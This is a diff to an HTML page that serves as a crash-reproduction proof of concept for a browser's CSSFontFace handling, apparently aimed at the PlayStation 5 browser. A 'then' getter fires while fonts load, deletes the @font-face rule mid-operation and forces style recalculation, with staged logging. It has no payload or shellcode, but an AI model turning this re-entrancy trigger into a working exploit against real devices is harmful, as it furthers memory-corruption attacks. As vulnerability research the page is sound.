@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CSSFontFace crashpoint marker</title>
+<title>CSSFontFace original crash marker diagnostic</title>
 <style>
 html {
     font-family: system-ui, -apple-system, sans-serif;
@@ -22,9 +22,7 @@ body {
     margin: 12px 0;
     background: #181818;
 }
-.warn {
-    color: #ffd479;
-}
+.warn { color: #ffd479; }
 #stage {
     font-size: 21px;
     font-weight: 700;
@@ -48,47 +46,43 @@ body {
 </style>
 </head>
 <body>
-
-<h1>CSSFontFace crashpoint marker</h1>
-
+<h1>CSSFontFace original crash marker diagnostic</h1>
 <div class="box warn">
-Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP, no sandbox escape.
+Diagnostic-only page. No heap spray, no exploit primitives, no ARW/addrof/fakeobj,
+no shellcode, no ROP/JOP, no sandbox escape.
 </div>
-
 <div class="box">
     <div id="stage">Stage: not started</div>
     <div id="probe">AB</div>
 </div>
-
 <div class="box">
     <h3>Current log</h3>
     <pre id="log"></pre>
 </div>
-
 <div class="box">
     <h3>Previous persisted log</h3>
     <pre id="previous"></pre>
 </div>
-
 <script>
 (function () {
     "use strict";
-
-    const STORAGE_KEY = "cssfontface-crashpoint-marker-log";
+    if (window.testRunner) {
+        testRunner.dumpAsText();
+        testRunner.waitUntilDone();
+    }
+    const STORAGE_KEY = "cssfontface-original-crash-marker-log";
     const stageElement = document.getElementById("stage");
     const logElement = document.getElementById("log");
     const previousElement = document.getElementById("previous");
     const probe = document.getElementById("probe");
-
     let seq = 0;
-    let finished = false;
+    let runCounter = 0;
     let createdFaces = [];
     let active = null;
-
+    let finished = false;
     function now() {
         return new Date().toISOString();
     }
-
     function persist(line) {
         try {
             const old = localStorage.getItem(STORAGE_KEY) || "";
@@ -96,27 +90,25 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
         } catch (e) {
         }
     }
-
     function log(msg) {
         const line = "[" + (++seq) + "] " + now() + " :: " + msg;
         logElement.textContent += line + "\n";
         persist(line);
         try { console.log(line); } catch (e) {}
     }
-
     function stage(msg) {
         stageElement.textContent = "Stage: " + msg;
         log("STAGE => " + msg);
     }
-
     function finish() {
         if (finished)
             return;
         finished = true;
         log("NO CRASH OBSERVED");
         log("DONE");
+        if (window.testRunner)
+            testRunner.notifyDone();
     }
-
     function loadPrevious() {
         try {
             previousElement.textContent = localStorage.getItem(STORAGE_KEY) || "";
@@ -124,45 +116,44 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             previousElement.textContent = "localStorage unavailable: " + e;
         }
     }
-
     window.onerror = function (message, source, lineno, colno, error) {
         log("window.onerror: " + message + " at " + lineno + ":" + colno);
         if (error && error.stack)
             log("stack: " + error.stack);
     };
-
     window.onunhandledrejection = function (event) {
         log("unhandledrejection: " + event.reason);
     };
-
     window.addEventListener("beforeunload", function () {
         log("beforeunload fired");
     });
-
-    function cleanup() {
-        try {
-            const oldStyles = document.querySelectorAll("style[data-test-style='1']");
-            for (const s of oldStyles)
-                s.remove();
-        } catch (e) {
-            log("cleanup styles threw: " + e.name + ": " + e.message);
-        }
-
-        try {
-            if (document.fonts) {
-                for (const face of createdFaces)
-                    document.fonts.delete(face);
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    function removeOldStyles() {
+        const old = document.querySelectorAll("style[data-validation-style='1']");
+        for (const node of old)
+            node.remove();
+    }
+    function cleanupFaces() {
+        if (!document.fonts)
+            return;
+        for (const face of createdFaces) {
+            try {
+                document.fonts.delete(face);
+            } catch (e) {
+                log("document.fonts.delete threw: " + e);
             }
-        } catch (e) {
-            log("cleanup fonts threw: " + e.name + ": " + e.message);
         }
-
         createdFaces = [];
-        active = null;
+    }
+    function cleanup() {
+        removeOldStyles();
+        cleanupFaces();
         probe.style.fontFamily = "";
         probe.textContent = "AB";
+        active = null;
     }
-
     function cssRuleCount(styleElement) {
         try {
             if (!styleElement || !styleElement.sheet)
@@ -172,178 +163,192 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             return "throws:" + e.name;
         }
     }
-
-    function makeCSSFace(family) {
+    function makeStyle(family, cssVariant) {
         const style = document.createElement("style");
-        style.setAttribute("data-test-style", "1");
-
+        style.setAttribute("data-validation-style", "1");
+        let src;
+        if (cssVariant === "missing")
+            src = 'url("missing-font-' + runCounter + '.woff") format("woff")';
+        else
+            src = 'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")';
         style.textContent =
             '@font-face {\n' +
             '    font-family: "' + family + '";\n' +
-            '    src: local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New");\n' +
+            '    src: ' + src + ';\n' +
             '    unicode-range: U+0042;\n' +
             '}\n';
-
         document.head.appendChild(style);
         return style;
     }
-
-    function makeJSFace(family) {
+    function forceStyleRecalc(label) {
+        log("MARK: ENTER forceStyleRecalc " + label);
+        stage(label + " forceStyleRecalc body.offsetTop ENTER");
+        log("MARK: before body.offsetTop");
+        try {
+            const a = document.body.offsetTop;
+            log(label + ": body.offsetTop=" + a);
+        } catch (e) {
+            log(label + ": body.offsetTop threw: " + e.name + ": " + e.message);
+        }
+        log("MARK: after body.offsetTop");
+        stage(label + " forceStyleRecalc body.offsetTop EXIT");
+        stage(label + " forceStyleRecalc probe.offsetWidth ENTER");
+        log("MARK: before probe.offsetWidth");
+        try {
+            const b = probe.offsetWidth;
+            log(label + ": probe.offsetWidth=" + b);
+        } catch (e) {
+            log(label + ": probe.offsetWidth threw: " + e.name + ": " + e.message);
+        }
+        log("MARK: after probe.offsetWidth");
+        stage(label + " forceStyleRecalc probe.offsetWidth EXIT");
+        stage(label + " forceStyleRecalc getComputedStyle ENTER");
+        log("MARK: before getComputedStyle(probe).fontFamily");
+        try {
+            const c = getComputedStyle(probe).fontFamily;
+            log(label + ": fontFamily=" + c);
+        } catch (e) {
+            log(label + ": getComputedStyle threw: " + e.name + ": " + e.message);
+        }
+        log("MARK: after getComputedStyle(probe).fontFamily");
+        stage(label + " forceStyleRecalc getComputedStyle EXIT");
+        log("MARK: EXIT forceStyleRecalc " + label);
+    }
+    function checkBeforeLoad(family) {
+        let checkA = null;
+        let checkB = null;
+        let checkAB = null;
+        stage("before load check A ENTER");
+        log("MARK: before document.fonts.check before load A");
+        try {
+            checkA = document.fonts.check('16px "' + family + '"', "A");
+            log("document.fonts.check before load A=" + checkA);
+        } catch (e) {
+            log("document.fonts.check before load A threw: " + e.name + ": " + e.message);
+        }
+        log("MARK: after document.fonts.check before load A");
+        stage("before load check A EXIT");
+        stage("before load check B ENTER");
+        log("MARK: before document.fonts.check before load B");
+        try {
+            checkB = document.fonts.check('16px "' + family + '"', "B");
+            log("document.fonts.check before load B=" + checkB);
+        } catch (e) {
+            log("document.fonts.check before load B threw: " + e.name + ": " + e.message);
+        }
+        log("MARK: after document.fonts.check before load B");
+        stage("before load check B EXIT");
+        stage("before load check AB ENTER");
+        log("MARK: before document.fonts.check before load AB");
+        try {
+            checkAB = document.fonts.check('16px "' + family + '"', "AB");
+            log("document.fonts.check before load AB=" + checkAB);
+        } catch (e) {
+            log("document.fonts.check before load AB threw: " + e.name + ": " + e.message);
+        }
+        log("MARK: after document.fonts.check before load AB");
+        stage("before load check AB EXIT");
+        log("CHECK SUMMARY before load: A=" + checkA + ", B=" + checkB + ", AB=" + checkAB);
+        if (checkA === false && checkB === true && checkAB === false)
+            stage("MATCHED ORIGINAL CRASH STATE A=false B=true AB=false");
+        else
+            stage("CHECK STATE DIFFERENT: A=" + checkA + " B=" + checkB + " AB=" + checkAB);
+        return { a: checkA, b: checkB, ab: checkAB };
+    }
+    function mutateFromThenGetter(label) {
+        if (!active)
+            return;
+        active.reentered = true;
+        active.reentryCount++;
+        stage("RE-ENTRY FIRED from " + label);
+        log("THEN GETTER FIRED from " + label);
+        log("before mutation: cssRules=" + cssRuleCount(active.styleElement));
+        try {
+            const sheet = active.styleElement && active.styleElement.sheet;
+            if (sheet && sheet.cssRules && sheet.cssRules.length > 0) {
+                sheet.deleteRule(0);
+                log("deleteRule(0) executed");
+            } else {
+                log("deleteRule skipped: no cssRules");
+            }
+        } catch (e) {
+            log("deleteRule threw: " + e.name + ": " + e.message);
+        }
+        log("after deleteRule: cssRules=" + cssRuleCount(active.styleElement));
+        forceStyleRecalc("inside then getter");
+        try {
+            log("MARK: before document.fonts.check after mutation A");
+            const checkA = document.fonts.check('16px "' + active.family + '"', "A");
+            log("MARK: after document.fonts.check after mutation A");
+            log("MARK: before document.fonts.check after mutation B");
+            const checkB = document.fonts.check('16px "' + active.family + '"', "B");
+            log("MARK: after document.fonts.check after mutation B");
+            log("MARK: before document.fonts.check after mutation AB");
+            const checkAB = document.fonts.check('16px "' + active.family + '"', "AB");
+            log("MARK: after document.fonts.check after mutation AB");
+            log("document.fonts.check after mutation: A=" + checkA + ", B=" + checkB + ", AB=" + checkAB);
+        } catch (e) {
+            log("document.fonts.check after mutation threw: " + e.name + ": " + e.message);
+        }
+    }
+    function makeThenGetter(label) {
+        return function () {
+            log("then getter property read: " + label + ", armed=" + !!(active && active.armed));
+            if (active && active.armed)
+                mutateFromThenGetter(label);
+            return undefined;
+        };
+    }
+    function withTimeout(promise, ms) {
+        return new Promise(function (resolve) {
+            let done = false;
+            const timer = setTimeout(function () {
+                if (done)
+                    return;
+                done = true;
+                resolve({ type: "timeout" });
+            }, ms);
+            promise.then(function (value) {
+                if (done)
+                    return;
+                done = true;
+                clearTimeout(timer);
+                resolve({ type: "resolved", value: value });
+            }, function (error) {
+                if (done)
+                    return;
+                done = true;
+                clearTimeout(timer);
+                resolve({ type: "rejected", error: error });
+            });
+        });
+    }
+    function createJSFace(family) {
         const face = new FontFace(
             family,
             'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")',
             { unicodeRange: "U+0041" }
         );
-
         createdFaces.push(face);
         return face;
     }
-
-    function makeThenGetter(label) {
-        return function () {
-            log("then getter property read: " + label + ", armed=" + !!(active && active.armed));
-
-            if (active && active.armed) {
-                active.reentered = true;
-                active.reentryCount++;
-
-                stage("THEN GETTER FIRED");
-                log("THEN GETTER FIRED from " + label);
-                log("inside getter cssRules before=" + cssRuleCount(active.styleElement));
-
-                try {
-                    const sheet = active.styleElement && active.styleElement.sheet;
-                    if (sheet && sheet.cssRules && sheet.cssRules.length > 0) {
-                        sheet.deleteRule(0);
-                        log("inside getter deleteRule(0) executed");
-                    } else {
-                        log("inside getter deleteRule skipped");
-                    }
-                } catch (e) {
-                    log("inside getter deleteRule threw: " + e.name + ": " + e.message);
-                }
-
-                log("inside getter cssRules after=" + cssRuleCount(active.styleElement));
-
-                try {
-                    log("inside getter check A=" + document.fonts.check('16px "' + active.family + '"', "A"));
-                    log("inside getter check B=" + document.fonts.check('16px "' + active.family + '"', "B"));
-                    log("inside getter check AB=" + document.fonts.check('16px "' + active.family + '"', "AB"));
-                } catch (e) {
-                    log("inside getter check threw: " + e.name + ": " + e.message);
-                }
-            }
-
-            return undefined;
-        };
-    }
-
-    function checkOne(label, family, text) {
-        stage(label + " document.fonts.check " + text + " ENTER");
-        log("MARK: before document.fonts.check " + text);
-
-        let result = null;
-        try {
-            result = document.fonts.check('16px "' + family + '"', text);
-            log(label + " " + text + "=" + result);
-        } catch (e) {
-            log(label + " " + text + " threw: " + e.name + ": " + e.message);
-        }
-
-        log("MARK: after document.fonts.check " + text);
-        stage(label + " document.fonts.check " + text + " EXIT");
-        return result;
-    }
-
-    function checkFonts(label, family) {
-        const a = checkOne(label, family, "A");
-        const b = checkOne(label, family, "B");
-        const ab = checkOne(label, family, "AB");
-
-        log("CHECK SUMMARY " + label + ": A=" + a + ", B=" + b + ", AB=" + ab);
-
-        if (a === false && b === true && ab === false)
-            stage("MATCHED ORIGINAL CRASH CHECK STATE A=false B=true AB=false");
-        else
-            stage("CHECK STATE DIFFERENT FROM ORIGINAL");
-
-        return { a: a, b: b, ab: ab };
-    }
-
-    function forceStyleRecalc(label) {
-        log("MARK: ENTER forceStyleRecalc " + label);
-
-        stage(label + " forceStyleRecalc body.offsetTop ENTER");
-        log("MARK: before body.offsetTop");
-        try {
-            log(label + " body.offsetTop=" + document.body.offsetTop);
-        } catch (e) {
-            log(label + " body.offsetTop threw: " + e.name + ": " + e.message);
-        }
-        log("MARK: after body.offsetTop");
-        stage(label + " forceStyleRecalc body.offsetTop EXIT");
-
-        stage(label + " forceStyleRecalc probe.offsetWidth ENTER");
-        log("MARK: before probe.offsetWidth");
-        try {
-            log(label + " probe.offsetWidth=" + probe.offsetWidth);
-        } catch (e) {
-            log(label + " probe.offsetWidth threw: " + e.name + ": " + e.message);
-        }
-        log("MARK: after probe.offsetWidth");
-        stage(label + " forceStyleRecalc probe.offsetWidth EXIT");
-
-        stage(label + " forceStyleRecalc getComputedStyle ENTER");
-        log("MARK: before getComputedStyle(probe).fontFamily");
-        try {
-            log(label + " fontFamily=" + getComputedStyle(probe).fontFamily);
-        } catch (e) {
-            log(label + " getComputedStyle threw: " + e.name + ": " + e.message);
-        }
-        log("MARK: after getComputedStyle(probe).fontFamily");
-        stage(label + " forceStyleRecalc getComputedStyle EXIT");
-
-        log("MARK: EXIT forceStyleRecalc " + label);
-    }
-
-    async function run() {
-        loadPrevious();
-
-        try {
-            localStorage.removeItem(STORAGE_KEY);
-        } catch (e) {
-        }
-
-        stage("ready");
-        log("POC STARTED: CSSFontFace crashpoint marker");
-
+    async function runDocumentFontsLoad(getterMode, cssVariant) {
         cleanup();
-
+        runCounter++;
         if (!window.FontFace) {
             stage("FontFace API missing");
-            log("FontFace API unavailable");
-            finish();
+            log("FontFace API is not available");
             return;
         }
-
         if (!document.fonts) {
             stage("document.fonts missing");
-            log("document.fonts unavailable");
-            finish();
+            log("document.fonts is not available");
             return;
         }
-
-        const family = "ps5-crashpoint-" + Date.now();
-
-        stage("create CSS @font-face");
-        const styleElement = makeCSSFace(family);
-        log("family=" + family);
-        log("cssRules after CSS face=" + cssRuleCount(styleElement));
-
-        stage("create JS FontFace same family");
-        const jsFace = makeJSFace(family);
-        log("jsFace.status initial=" + jsFace.status);
-
+        const family = "ps5-reentry-" + getterMode + "-" + cssVariant + "-" + Date.now() + "-" + runCounter;
+        const styleElement = makeStyle(family, cssVariant);
+        probe.style.fontFamily = '"' + family + '"';
+        probe.textContent = "AB";
         active = {
             family: family,
             styleElement: styleElement,
@@ -351,103 +356,221 @@ Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP,
             reentered: false,
             reentryCount: 0
         };
-
-        stage("install own jsFace.then getter");
+        stage("setup " + getterMode + " + " + cssVariant);
+        log("family=" + family);
+        log("initial cssRules=" + cssRuleCount(styleElement));
+        log("initial document.fonts.size=" + document.fonts.size);
+        let oldProtoDesc = null;
+        let protoChanged = false;
         try {
-            Object.defineProperty(jsFace, "then", {
-                configurable: true,
-                get: makeThenGetter("jsFace.then")
-            });
-            log("installed own getter on jsFace.then");
-            log('"then" in jsFace=' + ("then" in jsFace));
-            log("own then descriptor exists=" + !!Object.getOwnPropertyDescriptor(jsFace, "then"));
-        } catch (e) {
-            log("install own getter threw: " + e.name + ": " + e.message);
-        }
-
-        stage("access jsFace.loaded");
-        try {
+            if (getterMode === "prototype") {
+                oldProtoDesc = Object.getOwnPropertyDescriptor(FontFace.prototype, "then");
+                Object.defineProperty(FontFace.prototype, "then", {
+                    configurable: true,
+                    get: makeThenGetter("FontFace.prototype.then")
+                });
+                protoChanged = true;
+                log("installed getter on FontFace.prototype.then");
+            }
+            const jsFace = createJSFace(family);
+            log("created JS FontFace; status=" + jsFace.status);
+            if (getterMode === "own") {
+                Object.defineProperty(jsFace, "then", {
+                    configurable: true,
+                    get: makeThenGetter("jsFace.then")
+                });
+                log("installed own getter on jsFace.then");
+            }
+            log('"then" in jsFace = ' + ("then" in jsFace));
+            log("own then descriptor exists = " + !!Object.getOwnPropertyDescriptor(jsFace, "then"));
+            log("prototype then descriptor exists = " + !!Object.getOwnPropertyDescriptor(FontFace.prototype, "then"));
             const loadedPromise = jsFace.loaded;
-            log("accessed jsFace.loaded; face.status=" + jsFace.status);
-
+            log("accessed jsFace.loaded before document.fonts.load; face.status=" + jsFace.status);
             loadedPromise.then(function (value) {
                 log("jsFace.loaded resolved callback; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status);
             }, function (error) {
                 log("jsFace.loaded rejected callback: " + error + ", status=" + jsFace.status);
             });
-
-            log("installed jsFace.loaded callbacks");
-        } catch (e) {
-            log("jsFace.loaded setup threw: " + e.name + ": " + e.message);
-        }
-
-        stage("assign probe font-family");
-        probe.style.fontFamily = '"' + family + '"';
-        probe.textContent = "AB";
-        log("probe assigned family and text AB");
-
-        /*
-         * Important: match the original crashing ordering:
-         * - access loaded
-         * - install own then getter
-         * - add JS face
-         * - run document.fonts.check A/B/AB
-         * - force style recalc
-         * No document.fonts.load here.
-         */
-        stage("add JS face to document.fonts");
-        try {
             document.fonts.add(jsFace);
-            log("document.fonts.add completed; size=" + document.fonts.size + ", status=" + jsFace.status);
-        } catch (e) {
-            log("document.fonts.add threw: " + e.name + ": " + e.message);
-            finish();
-            return;
-        }
-
-        /*
-         * Do NOT arm before check in this marker version.
-         * The original crash log showed then getter read with armed=false during add,
-         * then checks A/B/AB before document.fonts.load.
-         */
-        active.armed = false;
-        log("then getter remains disarmed for marker run");
-
-        const beforeState = checkFonts("before recalc", family);
-
-        log("MARK: completed before-recalc checks");
-        log("MARK: beforeState A=" + beforeState.a + ", B=" + beforeState.b + ", AB=" + beforeState.ab);
-
-        log("ABOUT TO FORCE STYLE RECALC");
-        forceStyleRecalc("preload");
-
-        stage("after forceStyleRecalc");
-        log("after recalc cssRules=" + cssRuleCount(styleElement));
-        log("after recalc jsFace.status=" + jsFace.status);
-        log("after recalc document.fonts.size=" + document.fonts.size);
-        log("after recalc reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
-
-        checkFonts("after recalc", family);
-
-        stage("wait for loaded callbacks");
-        setTimeout(function () {
-            stage("complete after callback wait");
-            log("final cssRules=" + cssRuleCount(styleElement));
+            log("added JS face to document.fonts; size=" + document.fonts.size + ", status=" + jsFace.status);
+            const beforeState = checkBeforeLoad(family);
+            log("MARK: completed document.fonts.check before load sequence");
+            log("MARK: beforeState A=" + beforeState.a + ", B=" + beforeState.b + ", AB=" + beforeState.ab);
+            log("MARK: before forceStyleRecalc before document.fonts.load");
+            forceStyleRecalc("before document.fonts.load");
+            log("MARK: after forceStyleRecalc before document.fonts.load");
+            active.armed = true;
+            stage("calling document.fonts.load");
+            log("MARK: before document.fonts.load call");
+            const loadPromise = document.fonts.load('16px "' + family + '"', "AB");
+            log("MARK: after document.fonts.load call");
+            log("document.fonts.load returned Promise");
+            const result = await withTimeout(loadPromise, 5000);
+            active.armed = false;
+            if (result.type === "resolved") {
+                const faces = result.value;
+                log("document.fonts.load resolved; faces.length=" + (faces && faces.length));
+                if (faces && faces.length) {
+                    for (let i = 0; i < faces.length; i++)
+                        log("returned face[" + i + "].status=" + faces[i].status + ", sameAsJSFace=" + (faces[i] === jsFace));
+                }
+            } else if (result.type === "rejected") {
+                log("document.fonts.load rejected: " + result.error);
+            } else {
+                log("document.fonts.load timed out");
+            }
+            forceStyleRecalc("after document.fonts.load");
             log("final jsFace.status=" + jsFace.status);
+            log("final cssRules=" + cssRuleCount(styleElement));
             log("final document.fonts.size=" + document.fonts.size);
             log("final reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
-            finish();
-        }, 1000);
+            if (active.reentered && cssRuleCount(styleElement) === "0")
+                stage("RE-ENTRY reached and CSS rule deleted");
+            else if (active.reentered)
+                stage("RE-ENTRY reached but CSS rule not deleted");
+            else
+                stage("NO RE-ENTRY observed");
+        } catch (e) {
+            active.armed = false;
+            stage("exception");
+            log("exception: " + e.name + ": " + e.message);
+            if (e.stack)
+                log("stack: " + e.stack);
+        } finally {
+            active.armed = false;
+            if (protoChanged) {
+                try {
+                    if (oldProtoDesc)
+                        Object.defineProperty(FontFace.prototype, "then", oldProtoDesc);
+                    else
+                        delete FontFace.prototype.then;
+                    log("restored FontFace.prototype.then");
+                } catch (e) {
+                    log("failed to restore FontFace.prototype.then: " + e.name + ": " + e.message);
+                }
+            }
+        }
     }
-
+    async function runDirectJSFaceLoad() {
+        cleanup();
+        runCounter++;
+        if (!window.FontFace) {
+            stage("FontFace API missing");
+            return;
+        }
+        const family = "ps5-direct-jsface-" + Date.now() + "-" + runCounter;
+        active = {
+            family: family,
+            styleElement: null,
+            armed: false,
+            reentered: false,
+            reentryCount: 0
+        };
+        stage("direct jsFace.load diagnostic");
+        try {
+            const jsFace = createJSFace(family);
+            Object.defineProperty(jsFace, "then", {
+                configurable: true,
+                get: makeThenGetter("direct jsFace.then")
+            });
+            log("created JS FontFace; status=" + jsFace.status);
+            log("installed own getter on jsFace.then");
+            const loadedPromise = jsFace.loaded;
+            log("accessed jsFace.loaded before jsFace.load()");
+            loadedPromise.then(function (value) {
+                log("jsFace.loaded resolved callback; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status);
+            }, function (error) {
+                log("jsFace.loaded rejected callback: " + error + ", status=" + jsFace.status);
+            });
+            active.armed = true;
+            stage("calling jsFace.load");
+            const p = jsFace.load();
+            log("jsFace.load returned Promise");
+            const result = await withTimeout(p, 5000);
+            active.armed = false;
+            if (result.type === "resolved")
+                log("jsFace.load resolved; valueIsFace=" + (result.value === jsFace) + ", status=" + jsFace.status);
+            else if (result.type === "rejected")
+                log("jsFace.load rejected: " + result.error + ", status=" + jsFace.status);
+            else
+                log("jsFace.load timed out; status=" + jsFace.status);
+            log("final reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
+            if (active.reentered)
+                stage("direct jsFace.load caused then getter read");
+            else
+                stage("direct jsFace.load did NOT read then getter");
+        } catch (e) {
+            active.armed = false;
+            stage("direct test exception");
+            log("exception: " + e.name + ": " + e.message);
+        }
+    }
+    function runManualGetterSanity() {
+        cleanup();
+        runCounter++;
+        if (!window.FontFace) {
+            stage("FontFace API missing");
+            return;
+        }
+        const family = "ps5-manual-" + Date.now() + "-" + runCounter;
+        active = {
+            family: family,
+            styleElement: null,
+            armed: true,
+            reentered: false,
+            reentryCount: 0
+        };
+        stage("manual getter sanity check");
+        try {
+            const jsFace = createJSFace(family);
+            Object.defineProperty(jsFace, "then", {
+                configurable: true,
+                get: makeThenGetter("manual jsFace.then")
+            });
+            log("installed own getter on jsFace.then");
+            log("about to read jsFace.then manually");
+            const value = jsFace.then;
+            log("manual read returned: " + value);
+            log("final reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
+            if (active.reentered)
+                stage("manual getter works");
+            else
+                stage("manual getter did NOT work");
+        } catch (e) {
+            stage("manual test exception");
+            log("exception: " + e.name + ": " + e.message);
+        } finally {
+            active.armed = false;
+        }
+    }
+    async function runAll() {
+        loadPrevious();
+        try {
+            localStorage.removeItem(STORAGE_KEY);
+        } catch (e) {
+        }
+        log("POC STARTED: CSSFontFace original crash marker diagnostic");
+        stage("auto sequence starting");
+        await runManualGetterSanity();
+        await sleep(100);
+        await runDocumentFontsLoad("own", "local");
+        await sleep(100);
+        await runDocumentFontsLoad("prototype", "local");
+        await sleep(100);
+        await runDocumentFontsLoad("own", "missing");
+        await sleep(100);
+        await runDirectJSFaceLoad();
+        await sleep(100);
+        stage("auto sequence complete");
+        finish();
+    }
     setTimeout(function () {
-        run().catch(function (e) {
-            log("TOP LEVEL ERROR: " + e.name + ": " + e.message);
+        runAll().catch(function (e) {
+            log("TOP LEVEL RUNALL ERROR: " + e.name + ": " + e.message);
             finish();
         });
-    }, 500);
+    }, 250);
 })();
 </script>
-
 </body>
 </html>
